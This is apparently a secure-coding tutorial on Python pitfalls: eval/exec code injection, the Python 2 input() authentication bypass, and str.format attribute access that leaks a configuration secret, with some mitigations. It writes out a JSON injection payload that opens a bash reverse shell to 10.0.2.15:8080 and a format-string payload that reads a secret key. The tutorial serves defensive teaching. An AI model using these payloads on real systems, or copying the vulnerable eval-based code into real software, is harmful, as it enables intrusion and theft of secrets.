### Introduction 
It is possible to create a secure program using a language that is full of vulnerabilities, and also it is possible to create a vulnerable program using a language designed to be secure.

Python has become immensely useful in Cyber Security as it supports and performs a multitude of Cyber Security functions such as malware analysis, scanning, and penetration testing functions. However, it might be very easy to make a mistake in any Python code and make the program vulnerable.

In this tutorial, I will help you avoid those mistakes.

![](https://media.giphy.com/media/3oKIPcqmx1mpCOJJp6/giphy.gif)

### Dangerous functions
Some functions can be dangerous by performing a sort of code injection and an authentication bypass. Let's be in the hacker's shoes, think like him, and learn how to protect our code.

#### Eval()
Python’s `eval()` gives you the ability to pass a string to execute it as a code. For example, `eval("2 ** 8")` will return `256`.
Let's make a simple python app:
```python
def addition(x, y):
  return eval("%s + %s" % (x, y))

result = addition(2, 4)
print(result)
```

This is a very simple calculator, which gives you the sum of two numbers. If you execute the code, then you will have `6` as a result.

Now let's turn this calculator to an application that uses JSON to pass user input:
```python
def addition(x, y):
  return eval("%s + %s" % (x, y))

result = addition(request.json['x'], request.json['y'])
print("Our result is %d." % result)
```

If we pass `{"x":"2", "y":"4"}` as our previous code, then the result will be `6` of course. But as we are thinking as a hacker, then let's try to provide something else:
```python
{"x":"__import__('os').system('bash -i >& /dev/tcp/10.0.2.15/8080 0>&1')#", "y":"4"}
```

This malicious code will force our calculator to call `os.system` then spawn a reverse shell to the IP "10.0.2.15" on PORT "8080".

#### Exec()
This function is just like `Eval()` which executes a string or a code object. You have just to replace the second line of our last code with:
```python
return exec("%s + %s" % (x, y))
```

And you can exploit it in the same way as we did before.

Now if you want to use those functions, you have to check which methods and variables the user is allowed to use by:
```python
exec('print(dir())')
```

The output is:
```
['In', 'Out', '_', '__', '___', '__builtin__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', '_dh', '_i', '_i1', '_i2', '_i3', '_i4', '_i5', '_i6', '_i7', '_i8', '_ih', '_ii', '_iii', '_oh', 'addition', 'exit', 'get_ipython', 'quit', 'result']
```

A lot of those variables and methods may not be necessary for your code. Therefore, you can restrict it for users bypassing optional `locals` and `globals` parameters to the method.
For example:
```python
from math import *
exec('print(dir())')
```

Then the output will be:
```
['In', 'Out', '_', '__', '___', '__builtin__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', '_dh', '_i', '_i1', '_i10', '_i11', '_i2', '_i3', '_i4', '_i5', '_i6', '_i7', '_i8', '_i9', '_ih', '_ii', '_iii', '_oh', 'acos', 'acosh', 'addition', 'asin', 'asinh', 'atan', 'atan2', 'atanh', 'ceil', 'copysign', 'cos', 'cosh', 'degrees', 'e', 'erf', 'erfc', 'exit', 'exp', 'expm1', 'fabs', 'factorial', 'floor', 'fmod', 'frexp', 'fsum', 'gamma', 'gcd', 'get_ipython', 'hypot', 'inf', 'isclose', 'isfinite', 'isinf', 'isnan', 'ldexp', 'lgamma', 'log', 'log10', 'log1p', 'log2', 'math', 'modf', 'nan', 'pi', 'pow', 'quit', 'radians', 'remainder', 'result', 'sin', 'sinh', 'sqrt', 'tan', 'tanh', 'tau', 'trunc']
```

If we pass an empty dictionary as globals, then only the __builtins__ will be available to the object. That means if you try to access any of the functions which are available by the math module, then it will raise an exception:
```python
from math import *
exec('print(dir())', {})
```

The output is:
```python
['__builtins__']
```

If you want to provide a specific method along with the __builtins__ then you need to do the following:
```python
from math import *
exec('print(dir())', {'squareroot': sqrt})

exec('print(squareroot(16))', {'squareRoot': sqrt})
```

This will give the user the ability to execute the `sqrt` method by using `squareroot()`. However, if he tries to use `sqrt()` then it will raise an exception.

The output here is:
```python
['__builtins__', 'squareRoot']
4.0
```

#### Input()
You can find this vulnerability only in [Python 2](https://www.python.org/downloads/release/python-272/) and you can't find it in [Python 3](https://www.python.org/downloads/).

This function in Python 2 takes the value type, as it is without changing its type. 
```python
secret = 5
number = input("Expect the secret number")
if number==secret:
    print("YES")
else:
    print("NO")
```

Now we have a secret number, and we want the user to expect it. If we pass `5` then the result will be `YES` and otherwise it will be `NO`, but if we pass `secret` then the result will be `YES` because the Python conditional now is:
```python
if secret==secret: // This will be true
```

And just like that, you can pass any password leading to authentication bypass. Also, there are a lot of other ways to exploit this function.

To fix this issue, you just need to use `raw_input()` instead of `input()` while you are using Python 2 because it is converting any input to a string. If you are using Python 3 then don't worry about it while it is doing just the same as `raw_input()`.

### String formatting exploiting
This can be a very dangerous method because it leads the hackers to authentication bypass and to get access to sensitive information. So how does this really work?

Let's build a simple app, assume that *CONFIG* contain sensitive information like an *API key*:
```python
CONFIG = {
    "KEY" : "SECRET_KEY"
}
class info:
    def __init__(self, first, last):
        self.first = first
        self.last = last

def getName(some_str, peopleinfo_obj):
    return some_str.format(peopleinfo_obj = peopleinfo_obj)

people = info('Ahmad', 'Mardeni')

stri = input()
getName(stri, peopleinfo_obj = people)
```

Now if the user passes the following as input:
```python
Name_is_{peopleinfo_obj.first}_{peopleinfo_obj.last}
```

Then the output will be:
```python
'Name_is_Ahmad_Mardeni'
```

But if he passes the following as input:
```python
{peopleinfo_obj.__init__.__globals__[CONFIG][KEY]}
```

Then our sensitive information will be compromised and the output will be:
```python
'SECRET_KEY'
```

That happened because the string formatting function has the ability to access attributes objects. And the question now, is it still good to use `str.format()`? Yes, but you have to be aware that it becomes vulnerable when it is used over user-controlled strings.

### Conclusion 
We learned about the dangerous functions `eval()`, `exec()` ,and `input()`, how hackers can use them to hack your Python code, and finally, how to protect yourself against them. But anyway, you have to pay an attention to vulnerabilities besides the language-specific ones, like [XSS](https://owasp.org/www-community/attacks/xss/), [SQL injection](https://www.w3schools.com/sql/sql_injection.asp), etc...

Till next time, happy coding Pythonistas!

![](https://media.giphy.com/media/LmNwrBhejkK9EFP504/giphy.gif)

### Further reading
1. [Exploiting Python pickles](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
2. [YAML Deserialization Attack in Python](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf?utm_source=dlvr.it&utm_medium=twitter)
